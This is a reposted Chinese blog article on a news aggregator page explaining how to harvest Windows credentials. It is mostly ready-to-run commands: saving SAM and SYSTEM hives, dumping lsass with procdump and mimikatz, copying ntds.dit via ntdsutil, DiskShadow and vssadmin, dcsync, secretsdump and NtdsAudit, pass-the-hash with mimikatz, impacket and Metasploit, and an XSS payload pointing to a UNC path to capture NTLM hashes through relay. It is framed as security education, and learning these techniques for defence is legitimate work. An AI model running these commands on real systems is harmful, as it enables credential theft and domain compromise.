<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>黑客攻击中最常见的“用户凭证”，到底是什么？ | 极客快訊</title><meta property="og:title" content="黑客攻击中最常见的“用户凭证”，到底是什么？ - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p3.pstatp.com/large/pgc-image/c357560982c640efb9d6b90ef0f08085"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/07abeb8b.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/07abeb8b.html><meta property="article:published_time" content="2020-11-14T21:07:08+08:00"><meta property="article:modified_time" content="2020-11-14T21:07:08+08:00"><meta name=Keywords content><meta name=description content="黑客攻击中最常见的“用户凭证”，到底是什么？"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/07abeb8b.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>黑客攻击中最常见的“用户凭证”，到底是什么？</h1></header><date class="post-meta meta-date">2020-11-14</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>我们都知道，就用户隐私泄露风险而言，网络钓鱼是最大的威胁，其次是键盘记录器，然后是第三方黑客方式。</p><p>而黑客攻击是用户凭证泄露最常见的方式，<strong>但是由于暴露额外信息，网络钓鱼诈骗更加危险。</strong></p><p><br></p><p><strong>今天安仔就跟大家聊一聊Windows如何获取用户凭证，</strong>这里说的用户凭证获取，一般是指 ntlm hash 或者可以直接利用的明文密码。其他加密方式的用户凭证不在本次讨论范围内。</p><h1 class=pgc-h-arrow-right><strong>1、本地用户凭证</strong></h1><p><strong>a、通过SAM文件破解</strong></p><pre><code>reg save hklm\sam C:\sam.hivereg save hklm\system C:\system.hive</code></pre><p><strong>b、获取lsass内存</strong></p><p><strong>1.procdump</strong></p><p>procdump是微软提供的一款监测cpu峰值协助管理员检测异常数据的软件是合法可信任软件因此杀软不会拦截。</p><p>利用该软件可读取内存的特性可以将计算机用户登录内存抓取出来。具体命令如下</p><pre><code>以管理员身份启动cmdprocdump64.exe -accepteula -ma lsass.exe 存放路径\文件名</code></pre><p>将生成的文件传出后使用mimikatz破解</p><pre><code>mimikatz # sekurlsa::minidump 文件名mimikatz # sekurlsa::logonPasswords full</code></pre><p><strong>2.创建转储文件</strong></p><p>除了使用工具软件获得 lsass.exe 的内存外还可以直接在任务管理器中创建 lsass.exe 的转储文件效果和 procdump 生成的效果一样。</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/c357560982c640efb9d6b90ef0f08085><p class=pgc-img-caption></p></div><p><br></p><h1 class=pgc-h-arrow-right><strong>2、域用户凭证</strong></h1><p><strong>a、ntdsutil 域快照</strong></p><p>ntdsutil 是一个命令行工具是域控制器生态系统的一部分其主要用途是使管理员能够轻松访问和管理 Windows Active Directory 数据库。但它常被渗透测试人员或红队队员滥用来获取现有的 ntds.dit 文件快照。在 Windows Server 2008 及以上版本的系统中可直接使用 ntdsutil。</p><pre><code>ntdsutilactivate instance ntdsifmcreate full C:\ntdsutilquitquit</code></pre><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/203ef002f380486fbfb5d8c4580ce39b><p class=pgc-img-caption></p></div><p><strong>b、DiskShadow</strong></p><p>DiskShadow 是一个 Microsoft 签名二进制文件用于协助管理员执行与卷影复制服务VSS相关的操作。这个二进制文件有两个模式 interactive 和 script 脚本将包含自动执行 NTDS.DIT 提取过程所需的所有命令。可以在脚本文件中添加以下行以创建新的 volume shadow copy卷影复制挂载新驱动执行复制命令以及删除 volume shadow copy。</p><pre><code>set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% z:exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\ntds\ntds.ditdelete shadows volume %someAlias%reset</code></pre><p>需要注意的是DiskShadow二进制文件需要从C:\Windows\System32路径执行。如果从其它路径调用它脚本将无法正确执行同时该脚本文件保存时编码格式不能选择 UTF-8 要选择 ASCII 编码否则运行会报错。</p><pre><code>diskshadow.exe /s c:\diskshadow.txt</code></pre><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/98af5d3933174c7b8c6f7162c21fe19c><p class=pgc-img-caption></p></div><p>SYSTEM注册表hive也应该被复制因为其包含了解密NTDS文件内容所需的密钥。</p><pre><code>reg.exe save hklm\system c:\ntds\system.bak</code></pre><p><strong>c、vssadmin</strong></p><p>vssadmin 即卷影复制服务Volume Shadow Copy Service是微软Windows的一项组件服务从Windows XP开始支持。管理员可以使用卷影复制服务备份计算机卷以及文件即使操作系统正在使用这些资源。</p><p><strong>1.备份方法</strong></p><pre><code>vssadmin create shadow /for=C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[ID]\windows\ntds\ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[ID]\windows\system32\config\SYSTEMvssadmin delete shadows /shadow=[GUID]</code></pre><p>其中的HarddiskVolumeShadowCopy[ID]中的[ID]和[GUID]均为动态生成需要根据回显结果输入。如下图：</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/8f58d7158e6644bab4097e8d5033c410><p class=pgc-img-caption></p></div><p>可以看出[ID]为1"[GUID]为c73089ab-8634-457c-8ee7-b8c0ed2432ad。</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/8dc224a029a9462a8e542b60568a0006><p class=pgc-img-caption></p></div><p><strong>2.windows server 03</strong></p><p>如果系统是 server 03 在执行完毕之后还需要使用esentutl对ntds进行修复。</p><pre><code>esentutl /r edb /8 /d /oesentutl /p .\ntds.dit /8 /o</code></pre><p><br></p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/dbd0b68ddaa8469b9340d608b2bda1f4><p class=pgc-img-caption></p></div><p>需要注意的是该操作必须在 windows server 2003 上执行。</p><p><strong>d、Mimikatz</strong></p><p>Mimikatz 有一个功能 dcsync 利用目录复制服务 DRS从 NTDS.DIT 文件中检索密码哈希值。该技术消除了直接从域控制器进行认证的必要性，因为它可以以域管身份在域的任意系统执行，或是使用黄金票据从任意可连接到域控的服务器执行。因此这也是一项用于红队的标准技术。</p><pre><code>lsadump::dcsync /domain:aptlab.com /all /csv</code></pre><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/36c78d80e73f4475a832526920b25b4e><p class=pgc-img-caption></p></div><p>通过使用 /user 参数指定域用户名Mimikatz 会将该指定用户的所有帐户信息转储包括哈希值。</p><pre><code>lsadump::dcsync /domain:pentestlab.local /user:test</code></pre><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/dae34740d91b45b8949f8eb4d99c1da0><p class=pgc-img-caption></p></div><p><strong>e、secretsdump</strong></p><p>利用 impacket 下的 secretsdump 模块也可以实现远程盗取 ntds 内容。同时该工具支持 hash 传递攻击。</p><pre><code>python secretsdump -hashes :NThash -just-dc domain/dc\$@ipaddress</code></pre><h1 class=pgc-h-arrow-right><strong>3、ntds文件解密</strong></h1><p>破解ntds文件的方法有很多软件也有很多包括Impacket-secretsdump、Quarks PwDump等。</p><p>这里推荐使用NtdsAudit工具。</p><p>该工具可以十分高效的破解ntds文件并将全部域用户信息导出方便查找域用户状态。</p><p>将ntds.dit文件和SYSTEM文件放在同一目录下执行命令</p><pre><code>NtdsAudit.exe "ntds.dit" -s "SYSTEM" -p pwdump.txt --users-csv users.csv</code></pre><p>执行完毕后会生成两个文件pwdump.txt和users.csv其中pwdump.txt为用户hash文件包含用户名及hashusers.csv文件为域用户的详细信息包括账户是否过期是否为管理员上次密码修改时间等。</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9b1ab9a89e604f91be802a1de957cc63><p class=pgc-img-caption></p></div><p><strong>需要注意的是该工具只能在win10server16未测试上执行。</strong></p><p>使用不同工具破解ntds文件时需要注意最好使用与导出ntds文件域控相同操作系统版本的系统进行破解否则可能会出现失败的情况。</p><h1 class=pgc-h-arrow-right><strong>4、NTLM 协议攻击思路</strong></h1><p><strong>（1）hash 传递</strong></p><p>hash传递攻击pass the hash简称 PTH 。</p><p>由于 NTLM 验证过程中在 type 3 阶段计算 response 的时候客户端是使用用户的 hash 进行计算的而不是用户密码进行计算的。因此在模拟用户登录的时候是不需要用户明文密码的只需要用户hash。</p><p>微软在2014年5月13日发布了针对 Pass The Hash 的更新补丁 kb2871997标题为"Update to fix the Pass-The-Hash Vulnerability",而在一周后却把标题改成了"Update to improve credentials protection and management"。同时该补丁还能阻止mimikatz 抓取明文密码。</p><p>严格意义上讲hash传递只是完成一个不需要输入密码的NTLM协议认证流程所以并不算是一个漏洞只能算是一个技巧。</p><p><strong>a、常用工具</strong></p><p>哈希传递作为一个比较常见的攻击方式对应的工具有很多。常见的有</p><p><strong>1.mimikatz</strong></p><pre><code>privilege::debugsekurlsa::pth /user:win10 /domain:test.local/ntlm:6a6293bc0c56d7b9731e2d5506065e4a</code></pre><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ef2218895524429e9480ae742b01f6e5><p class=pgc-img-caption></p></div><p><strong>2.impacket</strong></p><p>impacket的模块中有5个都支持 hash 传递。</p><pre><code>psexec.pysmbexec.pyatexec.pywmiexec.pydcomexec.py</code></pre><p><strong>举例说明</strong></p><pre><code>python wmiexec.py -hash LMhash:NThash username@ipaddresspython wmiexec.py -hashes :NThash username@ipaddress</code></pre><p>3.msf</p><pre><code>use exploit/windows/smb/psexec_psh</code></pre><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ff429fe8be944971b793279154b2eb59><p class=pgc-img-caption></p></div><p>4.CobalStrike</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ca5541e4c1794e16a80e32c4d478df5f><p class=pgc-img-caption></p></div><p><strong>（2）中间人攻击</strong></p><p>NTLM relay攻击即中间人攻击。由于 NTLM 协议是一个嵌入式的协议因此当 NTLM 的上层协议是 smb 的情况下ntlm relay 就是 smb relay。那如果上层协议是 http也可以叫做 http relay但是都统称 ntlm relay。</p><p><strong>a、ntlm relay 的一般过程</strong></p><p>正常的 ntlm 认证 type 1type 2type 3 流程。</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/3a9211907d6a48e8b2aef3012caafbdd><p class=pgc-img-caption></p></div><p>而中间人攻击则是在这个过程中作为中间人攻击者将来自客户端的包(type 1)转发给服务端将来自服务端的challenge(type 2)转发给客户端然后客户端计算完response 之后再把response(type 3) 转发给服务端服务端验证rsponse通过之后授予攻击者访问的权限。</p><div class=pgc-img><img alt=黑客攻击中最常见的“用户凭证”，到底是什么？ onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/def6595c90ba49d38b6b4ecbbbefd0fa><p class=pgc-img-caption></p></div><p><strong>b、跨协议的relay</strong></p><p>鉴于 NTLM 协议的特性也可以在一个协议里面提取 ntlm 认证信息放进另外一个协议里面实现跨协议的relay。</p><p><strong>c、中继和反射relay or reflet</strong></p><p><strong>什么是反射</strong></p><p>如果 Inventory Server 和 Target 是同一台机器攻击者拿到 Inventory Server 发来的请求之后发回给 Inventory Server 进行认证。这个就是<strong>反射reflect。</strong></p><p><strong>反射的应用</strong></p><p>在工作组环境里面工作组中的机器之间相互没有信任关系每台机器的账号密码只是保存在自己的SAM文件中此时将中继到其他机器就没有任何意义了。</p><p>最能体现其特点的就是 CVE-2018-8581。通过抓到管理员hash并将其反射回自己从而实现短暂的权限提升。</p><p><strong>d、NTLM 请求发起</strong></p><p>既然是中间人攻击那么关键问题就在于如何才能发起请求。发起请求的方法有很多但使用条件都较为苛刻就不过多赘述这里只介绍可行性最大的一种。</p><p><strong>XSS & Outlook</strong></p><p>利用xss构造</p><pre><code>&lt;script src="\\ipaddressss"&gt;</code></pre><p>这种情况适用于 IE 和 edge其他浏览器不允许从 http 协议跨到 file 协议。</p><p>如果使用 http 请求来发起认证在默认情况下需要手动输入用户信息进行验证除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。</p><p>除非在安全设置中将"用户身份验证"选项中"登录"设置为自动使用当前用户名和密码登录才能拿到用户的net-ntlm hash。</p><p>发送邮件是支持html的并且 outlook 中的图片加载路径可以是 UNC。同 XSS 将图片地址构造为攻击 payload。</p><p>当收件人打开outlook查看邮件的时候就可以收到net-ntlm hash。。。。</p><p>我是安仔，一名刚入职网络安全圈的网安萌新，欢迎关注我，跟我一起成长；私信回复【资料】 领取更多文章和学习资料，加入安全大咖学习交流群，一起进步。</p><p>小白入行网络安全、混迹安全行业找大咖，以及更多成长干货资料，欢迎关注<a class=tteditor-forum data-concern-id=1667099819060248 data-id=1667099819060248 data-name=安界网人才培养计划 data-uid>#安界网人才培养计划#</a>、<a class=tteditor-forum data-concern-id=1630858953410567 data-id=1630858953410567 data-name=网络安全在我身边 data-uid>#网络安全在我身边#</a>、<a class=tteditor-mention data-concern-id data-id data-name=安界人才培养计划 data-uid=3443310982085820>@安界人才培养计划</a>。</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'攻击','最常见','用户'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>